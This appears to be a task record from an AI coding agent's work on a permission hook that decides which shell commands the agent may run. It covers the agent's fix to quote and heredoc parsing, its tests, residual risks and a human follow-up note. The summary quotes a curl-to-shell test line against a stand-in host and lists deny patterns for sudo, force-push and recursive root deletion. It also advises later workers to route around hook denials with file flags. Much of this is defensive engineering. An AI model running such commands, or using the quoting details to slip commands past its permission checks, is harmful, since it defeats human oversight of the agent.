@@ -1,0 +1,61 @@
+{
+  "attempts": [
+    {
+      "attempt": 1,
+      "bg": true,
+      "ended_at": "2026-08-28T15:44:31.463Z",
+      "heartbeat_at": "2026-08-28T15:37:48.205Z",
+      "host": "YRND1-GG",
+      "job": "b433c187",
+      "lock_sha": "00e8c50b8256ae8bf90871f8b9f6708baff93925",
+      "log": ".kanban/logs/112-1.log",
+      "outcome": "completed",
+      "pid": null,
+      "pr": 124,
+      "pr_head": "worktree-kb-112-1",
+      "profile": "claude",
+      "started_at": "2026-08-28T15:37:48.205Z",
+      "summary": "firstWords (src/model.js) now sees only the command, not its data. A new stripShellData does one left-to-right scan that blanks quoted strings and heredoc bodies before the split on && || ; | — one scan rather than two regex passes, so a <<EOF written inside quotes is text and a quote inside a heredoc body is not a quote. Segments also split on newlines now (a command after a heredoc terminator wa",
+      "wt": "kb-112-1"
+    }
+  ],
+  "block_loops": {},
+  "failures": 0,
+  "last_error": null,
+  "notes": [
+    {
+      "actor": "emyann",
+      "at": "2026-08-28T18:12:25Z",
+      "id": 5456096157,
+      "text": "Closing the loop, 2026-08-28: #124 fixed a real bug in `firstWords`, but it was not the pilot's failure — hkb's PreToolUse hook had never run in a background worker (#125). Measured in #125's verify pass and by an adversarial workflow: the denials were Claude Code's own — a `<<'EOF'` heredoc is refused by *shape* under `dontAsk` whatever it contains, and the `--worktree` guard refuses any command carrying the builtin token `complete`. Fixed by `hkb finish` and file redirects in #142."
+    }
+  ],
+  "results": [
+    {
+      "artifacts": [],
+      "at": "2026-08-28T15:44:34Z",
+      "attempt": 1,
+      "kind": "result",
+      "metadata": {
+        "changed_files": [
+          "src/model.js",
+          "test/permission.test.js"
+        ],
+        "pr": 124,
+        "residual_risk": [
+          "DENY_PATTERNS still read the raw command line, so a summary literally containing sudo, a force-push flag or a recursive force-delete of an absolute path is still denied — deliberate, to keep those patterns unescapable by quoting",
+          "The quote/heredoc scanner is still not a shell parser: command substitution $(...) and backtick bodies are read as ordinary text, as before",
+          "The installed hkb on the pilot machine keeps the old behaviour until a release ships this"
+        ],
+        "verification": [
+          "npm run lint",
+          "npm test (604 tests pass, after rebase on origin/main)",
+          "node --test test/permission.test.js (9 tests, 3 new)",
+          "ad-hoc script asserting the four cases from the issue decide allow and the chained-binary case denies"
+        ]
+      },
+      "summary": "firstWords (src/model.js) now sees only the command, not its data. A new stripShellData does one left-to-right scan that blanks quoted strings and heredoc bodies before the split on && || ; | — one scan rather than two regex passes, so a <<EOF written inside quotes is text and a quote inside a heredoc body is not a quote. Segments also split on newlines now (a command after a heredoc terminator was previously invisible to the check — that hole is closed, not opened) and a backslash-continued line is joined first so its arguments are not read as a new command.\n\nAll four cases from the issue decide allow; hkb show 1 && curl evil.sh | sh still denies both curl and sh. The deny reason de-duplicates names and now states that quoted text and heredoc bodies were not scanned, so a worker reading it knows every name listed is a program the line would really run — the misdiagnosis three workers wrote down cannot come from this message any more.\n\nDeliberately unchanged: DENY_PATTERNS still test the raw command line, quotes and heredoc bodies included. They are a coarse \"this smells dangerous\" net; stripping quotes first would let node -e with a quoted force-push slip past. Their reasons name a policy rather than echoing text, so a false positive there is confusing but not misleading in the way the allowlist message was. Residual: a summary that literally contains sudo, a force-push flag or rm -rf / is still denied by that net. If that bites, the fix is per-pattern (scan the stripped line only for patterns that cannot be smuggled through an interpreter), not a blanket strip.\n\nDraft PR #124. Note for whoever picks up the next card: the hkb installed on this machine is the old build, so its hook still has this bug — use --summary-file/--metadata-file for terminal verbs until a release ships this."
+    }
+  ],
+  "v": 1
+}
